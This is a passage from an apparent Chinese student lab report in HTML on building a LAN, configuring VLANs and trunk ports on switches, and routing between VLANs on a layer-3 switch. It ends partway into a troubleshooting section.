center; height: 21px;">                192.168.20.254            </td>        </tr>        <tr style="height: 21px;">            <td style="width: 9.94565%; text-align: center; height: 21px;">                主机4            </td>            <td style="width: 12.0652%; text-align: center; height: 21px;">                S2126-1            </td>            <td style="width: 7.66304%; text-align: center; height: 21px;">                F0/2            </td>            <td style="width: 9.61956%; text-align: center; height: 21px;">                30            </td>            <td style="width: 18.0978%; text-align: center; height: 21px;">                192.168.30.1            </td>            <td style="width: 21.3587%; text-align: center; height: 21px;">                255.255.255.0            </td>            <td style="width: 21.1957%; text-align: center; height: 21px;">                192.168.30.254            </td>        </tr>        <tr style="height: 42px;">            <td style="width: 9.94565%; text-align: center; height: 42px;">                二层交换机1            </td>            <td style="width: 12.0652%; text-align: center; height: 42px;">                S3760-2            </td>            <td style="width: 7.66304%; text-align: center; height: 42px;">                F0/1            </td>            <td style="width: 9.61956%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 18.0978%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 21.3587%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 21.1957%; text-align: center; height: 42px;">                &nbsp;            </td>        </tr>        <tr style="height: 42px;">            <td style="width: 9.94565%; text-align: center; height: 42px;">                二层交换机2            </td>            <td style="width: 12.0652%; text-align: center; height: 42px;">                S3760-2            </td>            <td style="width: 7.66304%; text-align: center; height: 42px;">                F0/2            </td>            <td style="width: 9.61956%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 18.0978%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 21.3587%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 21.1957%; text-align: center; height: 42px;">                &nbsp;            </td>        </tr>        <tr style="height: 42px;">            <td style="width: 9.94565%; text-align: center; height: 42px;">                三层交换机            </td>            <td style="width: 12.0652%; text-align: center; height: 42px;">                S3760-2            </td>            <td style="width: 7.66304%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 9.61956%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 18.0978%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 21.3587%; text-align: center; height: 42px;">                &nbsp;            </td>            <td style="width: 21.1957%; text-align: center; height: 42px;">                &nbsp;            </td>        </tr>    </tbody></table><hr /><h1>    五、实验原理</h1><h2>    1. 二层交换技术</h2><p>    <span style="font-size: 16px;">        &emsp;&emsp;二层交换技术发展比较成熟，二层交换机属于数据链路层设备，可以识别数据包中的MAC地址信息，根据MAC地址进行转发，并将这些MAC地址与对应的端口记录在自己内部的一个地址表中。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;交换机的管理方式基本分为两种：带内管理和带外管理。通过交换机的Console口管理交换机属于带外管理，不占交换机的网络接口，其特点是需要使用配置线缆，近距离配置。    </span></p><hr /><h2>    2. VLAN技术</h2><p>    <span style="font-size: 16px;">        &emsp;&emsp;        <code>            VLAN（VirtualLocalAreaNetwork，虚拟局域网）        </code>        是指在一个物理网段内，进行逻辑的划分，划分成若干个虚拟局域网。VLAN最大的特性是不受物理位置的限制，可以进行灵活的划分。VLAN具备了一个物理网段所具备的特性。相同VLAN内的主机可以互相直接访问，不同VLAN间的主机之间互相访问必须经由路由设备进行转发。    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;Port Vlan是实现VLAN的方式之一，Port Vlan是利用交换机的端口进行VLAN的划分，一个端口只能属于一个VLAN。    </span></p><hr /><h2>    3. 三层交换技术</h2><p>    &emsp;&emsp;    <span style="font-size: 16px;">        三层交换机是在二层交换的基础上实现了三层的路由功能。三层交换机基于&ldquo;一次路由，多次交换&rdquo;的特性，在局域网环境中转发性能远远高于路由器。而且三层交换机同时具备二层的功能，能够和二层的交换机进行很好的数据转发。三层交换机的以太网接口要比一般的路由器多很多，更加适合多个局域网段之间的互联。    </span></p><hr /><h1>    六、实验方法及步骤</h1><h2>    (1) 简单局域网环境的搭建</h2><blockquote>    <p>        <span style="font-size: 16px;">            第一部分流程如下：        </span>    </p>    <p>        <span style="font-size: 16px;">            (1)分配一个192.168.1.0/24的网段        </span>    </p>    <p>        <span style="font-size: 16px;">            (2)给3个主机分配IP地址依次为192.168.1.1、192.168.1.2、192.168.1.3        </span>    </p>    <p>        <span style="font-size: 16px;">            (3)熟悉基本的命令，如ping命令、ipconfig命令、tracert命令        </span>    </p>    <p>        <span style="font-size: 16px;">            (4)实现同路由器下的主机连通性测试        </span>    </p></blockquote><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604182926275-1218752442.png"    alt="image" height="340" width="603" style="display: block; margin-left: auto; margin-right: auto;"    /></p><hr /><h3>    1.1 特定网段 192.168.168.1.0/24</h3><p class="md-end-block md-p md-focus">    <span style="font-size: 16px;">        <span class="md-pair-s md-expand">            &emsp;&emsp;            <code>                &emsp;192.168.1.0/24            </code>        </span>        <span class="md-plain">            是一个IP地址和子网掩码的组合，用于标识一个特定的网络段。这种表示方法称为        </span>        <span class="md-pair-s ">            <strong>                <span class="md-plain">                    CIDR（无类别域间路由）表示法                </span>            </strong>        </span>        <span class="md-plain">            。        </span>    </span></p><blockquote>    <p class="md-end-block md-p">        <span style="font-size: 16px;">            <span class="md-pair-s ">                <strong>                    <span class="md-plain">                        192.168.1.0                    </span>                </strong>            </span>            <span class="md-pair-s ">                <strong>                    <span class="md-plain">                        是网络的IP地址                    </span>                </strong>            </span>            <span class="md-plain">                。            </span>        </span>        <span style="font-size: 16px;">            <span class="md-pair-s ">                <strong>                    <span class="md-plain">                        /24                    </span>                </strong>            </span>            <span class="md-pair-s ">                <strong>                    <span class="md-plain">                        表示子网掩码的位数                    </span>                </strong>            </span>            <span class="md-plain">                。            </span>        </span>        <span style="font-size: 16px;">            <span class="md-plain">                在这种情况下，            </span>            <span class="md-pair-s ">                <strong>                    <span class="md-plain">                        子网掩码是 255.255.255.0                    </span>                </strong>            </span>            <span class="md-plain">                。            </span>        </span>    </p></blockquote><blockquote>    <p>        <span style="font-size: 16px;">            192.168.1.0/24 表示的网络范围是：        </span>        <br />        <span style="font-size: 16px;">            网络地址：192.168.1.0        </span>        <br />        <span style="font-size: 16px;">            可用的IP地址：192.168.1.1 至 192.168.1.254        </span>        <br />        <span style="font-size: 16px;">            广播地址：192.168.1.255        </span>    </p></blockquote><hr /><h3>    1.2 给3台主机分配IP地址</h3><table style="width: 21.2042%;">    <thead>        <tr>            <th style="text-align: center; width: 27.6656%;">                <span style="font-size: 16px;">                    主机名称                </span>            </th>            <th style="text-align: center; width: 30.7167%;">                <span style="font-size: 16px;">                    IP地址                </span>            </th>            <th style="text-align: center; width: 41.8462%;">                <span style="font-size: 16px;">                    子网掩码                </span>            </th>        </tr>    </thead>    <tbody>        <tr>            <td style="text-align: center; width: 27.6656%;">                <span style="font-size: 16px;">                    主机0                </span>            </td>            <td style="text-align: center; width: 30.7167%;">                <span style="font-size: 16px;">                    192.168.1.1                </span>            </td>            <td style="text-align: center; width: 41.8462%;">                <span style="font-size: 16px;">                    255.255.255.0                </span>            </td>        </tr>        <tr>            <td style="text-align: center; width: 27.6656%;">                <span style="font-size: 16px;">                    主机1                </span>            </td>            <td style="text-align: center; width: 30.7167%;">                <span style="font-size: 16px;">                    192.168.1.2                </span>            </td>            <td style="text-align: center; width: 41.8462%;">                <span style="font-size: 16px;">                    255.255.255.0                </span>            </td>        </tr>        <tr>            <td style="text-align: center; width: 27.6656%;">                <span style="font-size: 16px;">                    主机2                </span>            </td>            <td style="text-align: center; width: 30.7167%;">                <span style="font-size: 16px;">                    192.168.1.3                </span>            </td>            <td style="text-align: center; width: 41.8462%;">                <span style="font-size: 16px;">                    255.255.255.0                </span>            </td>        </tr>    </tbody></table><hr /><h3>    1.3 ping命令 测试主机间的连通性</h3><p>    &emsp;&emsp;    <span style="font-size: 16px;">        <code>            ping        </code>        命令是一个网络诊断工具，用于        <strong>            测试主机之间的网络连接是否正常        </strong>        。它通过发送ICMP（Internet Control Message Protocol，互联网控制消息协议）回显请求消息到目标主机，并等待接收回显响应消息来工作。    </span></p><blockquote>    <p>        <span style="font-size: 16px;">            当你执行ping命令时，它会做以下几件事：        </span>    </p>    <p>        <span style="font-size: 16px;">            1.发送一个或多个ICMP回显请求消息到指定的IP地址或域名。        </span>    </p>    <p>        <span style="font-size: 16px;">            2.等待目标主机收到请求并发送回一个ICMP回显响应消息。        </span>    </p>    <p>        <span style="font-size: 16px;">            3.显示往返时间（RTT，Round-Trip Time），即从发送请求到接收到响应所花费的时间。        </span>    </p>    <p>        <span style="font-size: 16px;">            4.显示发送和接收的包的数量，以及丢失的包的数量。        </span>    </p></blockquote><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604192824066-368374795.png"    alt="image" height="393" width="494" style="display: block; margin-left: auto; margin-right: auto;"    /></p><hr /><h3>    1.4 ipconfig命令 显示当前网络配置</h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;        <code>            ipconfig        </code>        是一个Windows操作系统中的命令行工具，        <strong>            用于显示当前的网络配置信息，包括IP地址、子网掩码、默认网关、DNS服务器等        </strong>        。    </span></p><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604183859130-160561217.png"    alt="image" height="398" width="500" style="display: block; margin-left: auto; margin-right: auto;"    /></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;我们在主机 0 的命令提示符上调用        <code>            ipconfig        </code>        命令，可以查看到主机 0 的网络配置信息    </span></p><pre class="language-armasm highlighter-hljs">    <code>        IP Address......................: 192.168.1.1 Subnet Mask.....................:        255.255.255.0 Default Gateway.................: 0.0.0.0    </code></pre><hr /><h3>    1.5 tracert命令 查看数据包从你的计算机到目标主机所经过的路由路径</h3><p>    &emsp;&emsp;    <span style="font-size: 16px;">        <code>            tracert        </code>        （在Windows中）或traceroute（在Unix/Linux和macOS中）命令是一个网络诊断工具，用于显示数据包从你的计算机到目标主机所经过的路由路径。这个命令通过发送一系列带有递增生存时间（TTL，Time        To Live）值的数据包来工作。    </span></p><blockquote>    <p>        <span style="font-size: 16px;">            当使用tracert或traceroute命令时，它会：        </span>    </p>    <p>        <span style="font-size: 16px;">            1.向目标主机发送一个TTL值为1的数据包。        </span>    </p>    <p>        <span style="font-size: 16px;">            2.第一个路由器（通常是你的本地ISP的路由器）收到这个数据包后，会将其转发一次，然后因为TTL值减为0而丢弃它，同时发送一个ICMP时间超过消息回给你的计算机。        </span>    </p>    <p>        <span style="font-size: 16px;">            3.你的计算机收到ICMP消息后，会记录下这个路由器的地址。        </span>    </p>    <p>        <span style="font-size: 16px;">            4.然后，tracert会发送一个TTL值为2的数据包，第二个路由器会将其转发一次，再次因为TTL值减为0而丢弃它，并发送ICMP消息。        </span>    </p>    <p>        <span style="font-size: 16px;">            5.这个过程会一直重复，直到数据包到达目标主机或达到最大TTL值。        </span>    </p></blockquote><p>    <span style="font-size: 16px;">        &emsp;&emsp;我们在主机0的命令提示符中输入命令        <code>            tracert 192.168.1.2        </code>        ，来查看数据包从主机0到主机2所经过的路由路径。    </span></p><pre class="language-armasm highlighter-hljs">    <code>        PC0&gt;tracert 192.168.1.2 Tracing route to 192.168.1.2 over a maximum        of 30 hops: 1 83 ms 49 ms 52 ms 192.168.1.2 Trace complete.    </code></pre><p>    &emsp;&emsp;    <span style="font-size: 16px;">        根据获得的        <code>            tracert命令        </code>        的输出结果，我们可以得出以下信息：    </span></p><table>    <thead>        <tr>            <th style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        名称                    </strong>                </span>            </th>            <th style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        分析                    </strong>                </span>            </th>        </tr>    </thead>    <tbody>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        目标主机                    </strong>                </span>            </td>            <td style="text-align: left;">                <span style="font-size: 16px;">                    正在追踪到IP地址192.168.1.2的路由路径。                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        最大跳数                    </strong>                </span>            </td>            <td style="text-align: left;">                <span style="font-size: 16px;">                    tracert命令设置了最大30跳，这意味着它将尝试追踪最多30个路由器或网络设备。                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        跳数和延迟                    </strong>                </span>            </td>            <td style="text-align: left;">                <span style="font-size: 16px;">                    第1跳：显示了3次测量的往返时间（RTT），分别是83毫秒、49毫秒和52毫秒。这些时间表示数据包从您的计算机发送到192.168.1.2，然后从该地址返回的时间。                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        路由路径                    </strong>                </span>            </td>            <td style="text-align: left;">                <span style="font-size: 16px;">                    输出结果只显示了一个跳数，这意味着数据包直接从您的计算机发送到了目标IP地址，没有经过其他中间路由器。                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        目标主机的响应                    </strong>                </span>            </td>            <td style="text-align: left;">                <span style="font-size: 16px;">                    192.168.1.2能够响应ICMP回显请求，这表明您的计算机和目标主机之间的网络连接是通畅的。                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        网络延迟                    </strong>                </span>            </td>            <td style="text-align: left;">                <span style="font-size: 16px;">                    网络延迟（或称为ping时间）相对较低，这通常意味着网络性能良好。                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        网络稳定性                    </strong>                </span>            </td>            <td style="text-align: left;">                <span style="font-size: 16px;">                    由于3次测量的RTT值相差不大，可以认为网络连接相对稳定。                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        网络拓扑                    </strong>                </span>            </td>            <td style="text-align: left;">                <span style="font-size: 16px;">                    由于只有一跳，这可能表明192.168.1.2与您的计算机位于同一局域网（LAN）内。                </span>            </td>        </tr>        <tr>            <td style="text-align: center;">                <span style="font-size: 16px;">                    <strong>                        Trace完成                    </strong>                </span>            </td>            <td style="text-align: left;">                <span style="font-size: 16px;">                    Trace complete.表示tracert命令已经完成其操作，没有更多的路由器或跳数需要追踪。                </span>            </td>        </tr>    </tbody></table><p>    <span style="font-size: 16px;">        &emsp;&emsp;综上所述，这个输出结果表明主机0与        <code>            IP地址：192.168.1.2        </code>        之间有一个直接的、低延迟的、稳定的网络连接，且目标主机1能够正常响应网络请求。即，根据上面的返回结果，        <strong>            我们可以判定主机0和主机1在同一个局域网（LAN）内。        </strong>    </span></p><hr /><h2>    (2)交换机常用的配置命令行及命令行操作模式</h2><h3>    2.1 交换机的命令行操作模式</h3><pre class="language-powershell highlighter-hljs">    <code>        用户模式 Switch&gt; 特权模式 Switch# 全局配置模式 Switch(config)# 端口模式 Switch(config-if)#    </code></pre><hr /><h3>    2.2 交换机的常用配置命令行</h3><pre class="language-powershell highlighter-hljs">    <code>        模式切换指令 enable 进入特权模式（一般简写为en） config t 进入全局配置模式 interface fa 0/1 进入交换机某个端口视图模式        exit 返回到上级模式 end 从全局以下模式返回到特权模式 快捷指令 帮助信息(如? 、co?、copy?)】 命令简写(如 en 的完整命令为        enable) 命令自动补全(Tab) 快捷键(ctrl+c中断测试,ctrl+z退回到特权视图) reload 重启(在特权模式下) hostname        X修改交换机名称(在全局配置模式下) 端口配置指令 speed,duplex 配置交换机端口参数 show version 查看交换机版本信息        show running-config 查看当前生效的配置信息 show startup-config 查看保存在NVRAM中的启动配置信息        show interface 查看端口信息 show mac-address-table 查看交换机的MAC地址 选择某个端口Switch(config)#        interface type mod/port (type：端口类型，通常有ethernet、Fastethernet、Gigabitethernet；        mod：端口所在的模块； port：在该模块中的编号；）:Switch(config)# interface fa 0/1; 选择多个端口Switch(config)#interface        type mod/startport-endport 如：Switch(config)# interface interface fa 0/1-5        //选择端口 fa 0/1 ~ fa 0/5 Switch(config-if)#speed [10/100/auto] 设置端口通信速度 Switch(config-if)#duplex        [half/full/auto] 设置端口单双工模式 若交换机设置为auto以外的具体速度，此时应注意保证通信双方也要有相同的设置值。 注意事项：在配置交换机时，要注意交换机端口的单双工模式的匹配，如果链路一端设置的是全双工，另一端是自动协商，则会造成响应差和高出错率，丢包现象会很严重。通常两端设置为相同的模式。        密码设置指令 设置进入特权模式的密码 Switch(config)# enable password ****** 通过console端口连接设备及Telnet远程登录时所需的密码；        Switch(config)# line console 0 表示配置控制台线路，0是控制台的线路编号。 Switch(config-line)#        login 用于打开登录认证功能。 Switch(config-line)# password 5ijsj 设置进入控制台访问的密码    </code></pre><p>    <span style="font-size: 16px;">        &emsp;&emsp;更加详细的交换机命令行内容请见该文：        <a href="https://blog.csdn.net/gengkui9897/article/details/85109962">            Packet Tracer 思科模拟器入门教程 之二 交换机的基本配置与管理_管理交换机的思科教程-CSDN博客        </a>    </span></p><hr /><h2>    (3)利用二层交换机实现同vlan间的通信</h2><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604191947337-364174296.png"    alt="image" height="382" width="708" style="display: block; margin-left: auto; margin-right: auto;"    /></p><blockquote>    <p>        <span style="font-size: 16px;">            第二部分流程如下：        </span>    </p>    <p>        <span style="font-size: 16px;">            （1）虚拟局域网vlan的配置，        </span>        <span style="font-size: 16px;">            规划两个vlan，分别是vlan10和vlan20。        </span>    </p>    <ul>        <li>            <span style="font-size: 16px;">                vlan10：192.168.1.0/24（我们希望主机0、主机1、主机2和主机4工作在vlan10中）            </span>        </li>        <li>            <span style="font-size: 16px;">                vlan20：192.168.2.0/24（我们希望主机3和主机5工作在vlan20中）            </span>        </li>    </ul>    <p>        <span style="font-size: 16px;">            （2）并将相应的接口指派到相应的vlan中去        </span>    </p>    <ul>        <li>            <span style="font-size: 16px;">                将交换机0与主机0/1/2相连的接口指派到对应的vlan10中;            </span>        </li>        <li>            <span style="font-size: 16px;">                将交换机0与主机3相连的接口指派到对应的vlan20中;            </span>        </li>        <li>            <span style="font-size: 16px;">                将交换机1与主机4相连的接口指派到对应的vlan10中;            </span>        </li>        <li>            <span style="font-size: 16px;">                将交换机1与主机5相连的接口指派到对应的vlan20中;            </span>        </li>    </ul>    <p>        <span style="font-size: 16px;">            （3）主机0/1/2和主机4的关系是：不同交换机、相同vlan中的主机;        </span>    </p>    <p>        <span style="font-size: 16px;">            （4）主机3和主机5的关系是：不同交换机、相同vlan中的主机。        </span>    </p>    <p>        <span style="font-size: 16px;">            1.3 将交换机0和交换机1之间相连的接口的工作模式设定为trunk模式        </span>    </p>    <p>        <span style="font-size: 16px;">            2.1 相同交换机、相同vlan中主机的互联互通        </span>    </p>    <p>        <span style="font-size: 16px;">            2.2 不同交换机、相同vlan中主机的互联互通        </span>    </p></blockquote><hr /><h3>    3.1    <code>        show vlan    </code>    命令查看当前vlan数据库情况</h3><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604192540437-2003316701.png"    alt="image" height="391" width="498" style="display: block; margin-left: auto; margin-right: auto;"    /></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;通过        <code>            show vlan        </code>        命令来查看当前接口的指派情况，我们可以看到        <strong>            交换机的 24 个接口默认都工作在了 vlan1 中        </strong>        。    </span></p><hr /><h3>    3.2 vlan 配置中添加vlan10和vlan20</h3><p>    <span style="font-size: 16px;">        &emsp;&emsp;在交换机配置页 VLAN 数据库中，我们分别添加 VLAN10（命名为 PC0124） 和 VLAN20（命名为 PC35）    </span></p><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/1fa836caa70a18f26e48c14f8a88589e7177.jpeg"    height="380" width="474" /></p><hr /><h3>    3.3 交换机的接口配置</h3><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/bdd5c1f971d2d0c2037d92da33928d9c7324.jpeg"    height="386" width="474" /></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;我们可以看到主机与交换机相连的接口，如下表：    </span></p><table>    <thead>        <tr>            <th style="text-align: center;">                主机名称            </th>            <th style="text-align: center;">                对应接口            </th>        </tr>    </thead>    <tbody>        <tr>            <td style="text-align: center;">                主机0            </td>            <td style="text-align: center;">                Fa0/1            </td>        </tr>        <tr>            <td style="text-align: center;">                主机1            </td>            <td style="text-align: center;">                Fa0/2            </td>        </tr>        <tr>            <td style="text-align: center;">                主机2            </td>            <td style="text-align: center;">                Fa0/3            </td>        </tr>        <tr>            <td style="text-align: center;">                主机3            </td>            <td style="text-align: center;">                Fa0/4            </td>        </tr>    </tbody></table><p style="text-align: left;">    <span style="font-size: 16px;">        <strong>            （1）我们依次将交换机0的接口1~3分别指派在vlan10中工作        </strong>        ，        <strong>            将接口4指派在vlan20中工作        </strong>        。    </span></p><p style="text-align: center;">    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604193157520-188582884.png"    alt="image" height="321" width="404" />    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604193202007-620659720.png"    alt="image" height="321" width="404" /></p><p style="text-align: center;">    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604193207566-670687621.png"    alt="image" height="321" width="404" />    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604193211003-188383751.png"    alt="image" height="321" width="404" /></p><p>    <span style="font-size: 16px;">        <strong>            （2）借助            <code>                show vlan            </code>            命令查看交换机0        </strong>        的配置后的vlan情况，我们可以看到现在的接口指派情况符合我们一开始的设定规划。    </span></p><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/a34c694014841f3783a1baaed32db6164521.jpeg"    height="390" width="486" /></p><p>    <span style="font-size: 16px;">        <strong>            （3）同理，我们在交换机1的配置中同样添加vlan10和vlan20        </strong>        ，并        <strong>            将接口1和接口2分别指派在vlan10和vlan20中工作        </strong>        ，最后借助show vlan命令查看        <strong>            交换机1        </strong>        的配置后的vlan情况    </span></p><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/d32b941aeeaf2c90698f62ff180913889553.jpeg"    height="341" width="480" /></p><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/a6e05c9631783e0b6c73b1f949fb4bfe9304.jpeg"    height="325" width="405" />    <img src="https://pic.rmb.bdstatic.com/bjh/240625/1e3194f0e3502e4f0ecbfa8647875b703130.jpeg"    height="325" width="405" /></p><p>    <span style="font-size: 16px;">        <strong>            （4）交换机0和交换机1之间相连的那个（交换机0的接口5，交换机1的接口2）的工作模式必须是 trunk 模式        </strong>    </span></p><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/cb5fefbf280ecbc076ee00fc1c83f7193907.jpeg"    height="132" width="625" /></p><pre class="language-plaintext highlighter-hljs">    <code>        命令行代码：switchport mode trunk    </code></pre><p>    <span style="font-size: 16px;">        &emsp;&emsp;也可以手动在路由器的接口配置中手动选择        <code>            <strong>                trunk模式            </strong>        </code>        （如下图）    </span></p><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/f5759851db88a725c52efebd6c5343ac2914.jpeg"    height="378" width="471" /></p><p>    <span style="font-size: 16px;">        <strong>            &emsp;&emsp;至此，所有的环境配置均已完成！！！        </strong>    </span></p><hr /><h3>    3.4 验证同vlan中主机间的互联互通</h3><h4>    3.4.1 相同交换机、相同vlan中主机的互联互通</h4><p>    <span style="font-size: 16px;">        &emsp;&emsp;主机0/1/2关系是：相同交换机、相同vlan中的主机    </span></p><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604194453262-1759198225.png"    alt="image" style="display: block; margin-left: auto; margin-right: auto;"    /></p><hr /><h4>    3.4.2 不同交换机、相同vlan中主机的互联互通</h4><p>    <span style="font-size: 16px;">        （1）主机0/1/2和主机4的关系是：不同交换机、相同vlan中的主机;    </span></p><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604194629325-1946999905.png"    alt="image" style="display: block; margin-left: auto; margin-right: auto;"    /></p><p>    <span style="font-size: 16px;">        （2）主机3和主机5的关系是：不同交换机、相同vlan中的主机。    </span></p><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604194721338-1521541257.png"    alt="image" style="display: block; margin-left: auto; margin-right: auto;"    /></p><hr /><h2>    (4)利用三层交换机实现不同vlan间的通信</h2><blockquote>    <p>        <span style="font-size: 16px;">            三层交换机：        </span>        <br />        <span style="font-size: 16px;">            三层交换机是所有vlan 的网关，每一个vlan的网关地址都要指派给三层交换机对应的虚拟接口        </span>        <br />        <span style="font-size: 16px;">            vlan10: &nbsp;ip address 192.168.1.254 255.255.255.0        </span>        <br />        <span style="font-size: 16px;">            vlan20: &nbsp;ip address 192.168.2.254 255.255.255.0        </span>    </p></blockquote><p>    <img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240604195041137-1779709001.png"    alt="image" height="372" width="904" style="display: block; margin-left: auto; margin-right: auto;"    /></p><hr /><h3>    4.1 实现过程概述</h3><blockquote>    <p>        <span style="font-size: 16px;">            对三层交换机进行的操作： &nbsp; &nbsp;        </span>        <br />        <span style="font-size: 16px;">            （1）trunk协议封装为dot1q ：            <code>                switchport trunk encapsulation dot1q            </code>        </span>    </p>    <p>        <span style="font-size: 16px;">            （2）端口模式为trunk &nbsp;：            <code>                switchport mode trunk&nbsp;            </code>        </span>    </p>    <p>        <span style="font-size: 16px;">            （3）分别进入vlan10和vlan20的设置模式：            <code>                inter vlan10(20)            </code>        </span>    </p>    <p>        <span style="font-size: 16px;">            （4）将每个vlan的网关地址指派给三层交换机对应的虚拟接口：        </span>    </p>    <ul>        <li>            <span style="font-size: 16px;">                vlan10: &nbsp;                <code>                    ip address 192.168.1.254 255.255.255.0                </code>            </span>        </li>        <li>            <span style="font-size: 16px;">                vlan20: &nbsp;                <code>                    ip address 192.168.2.254 255.255.255.0                </code>            </span>        </li>    </ul></blockquote><hr /><h3>    4.2 查看三层交换机的虚拟接口 Fa0/1和Fa0/2</h3><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/63a8c1468402b78b17046f3a29bb607b4618.jpeg"    height="272" width="510" /></p><p>    &emsp;&emsp;    <span style="font-size: 16px;">        这里，我们可以看到    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;        <strong>            三层交换机与交换机0连接的接口为：Fa0/1        </strong>    </span></p><p>    <span style="font-size: 16px;">        &emsp;&emsp;        <strong>            与交换机1连接的接口为：Fa0/2        </strong>    </span></p><hr /><h3>    4.3    <span style="font-size: 16px;">        trunk协议封装为dot1q ：        <code>            switchport trunk encapsulation dot1q        </code>    </span></h3><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/b977eb51cf8a4b5e2b6ddabda2781f4e8852.jpeg"    height="306" width="405" />    <img src="https://pic.rmb.bdstatic.com/bjh/240625/12b188286823ab3e719d1782bbf6a02f2363.jpeg"    height="306" width="405" /></p><hr /><h3>    4.4 设置接口    <span style="font-size: 16px;">        端口模式为trunk &nbsp;：        <code>            switchport mode trunk&nbsp;        </code>    </span></h3><p style="text-align: center;">    <a href="https://pic.rmb.bdstatic.com/bjh/240625/acf15d22f73b2b9bb0d9930fa96a21463614.jpeg">        <img src="https://pic.rmb.bdstatic.com/bjh/240625/138f28e0744f50ebc60c897b0965f3056401.jpeg"        height="325" width="405" />    </a>    <img src="https://pic.rmb.bdstatic.com/bjh/240625/acf15d22f73b2b9bb0d9930fa96a21463614.jpeg"    height="325" width="405" /></p><hr /><h3>    4.5    <span style="font-size: 16px;">        将每个vlan的网关地址指派给三层交换机对应的虚拟接口    </span></h3><blockquote>    <p>        <span style="font-size: 16px;">            vlan10: &nbsp;            <code>                ip address 192.168.1.254 255.255.255.0            </code>        </span>    </p>    <p>        <span style="font-size: 16px;">            vlan20: &nbsp;            <code>                ip address 192.168.2.254 255.255.255.0            </code>        </span>    </p></blockquote><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/5f15c5cc3b2255563c4473e3532bc1375191.jpeg"    height="329" width="410" />    <img src="https://pic.rmb.bdstatic.com/bjh/240625/9323db3529989a02d1e0c52f4ac94cc98834.jpeg"    height="310" width="410" /></p><hr /><h3>    4.6 查看所有接口的IP地址及状态    <code>        show ip interface brief    </code></h3><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/4b2df8ce789a1325138e8a395d6fdda29630.jpeg"    height="380" width="503" /></p><hr /><h3>    4.7 验证不同vlan间的互联互通</h3><p style="text-align: center;">    <img src="https://pic.rmb.bdstatic.com/bjh/240625/c12aedbd932f4bc00e9ddd66bd49a6682007.jpeg"    height="161" width="825" /></p><hr /><h1>    七、    <strong>        实验常见故障及分析    </strong></h1><p>    &emsp;    <span style="font-size: 16px;">        &emsp;在进行网络组建时，常常会碰到以下的故障现象，请思考如何进行故障诊断，并通过调试，解决网络的互联互通问题。    </span></p><hr /><h2>    <span style="font-size: 16px;">        1.未划分vlan，一个交换机上的主机ping不通？    </span></h2><ul>    <li>        <span style="font-size: 16px;">            <strong>                检查物理连接            </strong>            ：确保所有设备都正确连接到交换机，并且交换机的            <strong>                端口状态是up            </strong>            。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                检查IP配置            </strong>            ：确认主机的            <strong>                IP地址            </strong>            、            <strong>                子网掩码            </strong>            和            <strong>                默认网关            </strong>            是否配置正确，            <strong>                并且在同一子网内            </strong>            。        </span>    </li>    <li>        <span style="font-size: 16px;">            <strong>                检查交换机配置            </strong>            ：查看交换机是否有端口隔离或者安全设置阻止了数据包的传输。        </span>    </li></ul><hr /><h2>    <span style="font-size: 16px;">        2.划分vlan后，同一交换机上同vlan的主机ping不通？    </span></h2><ul>    <li>        <span style="font-size: 16px;">            <strong>                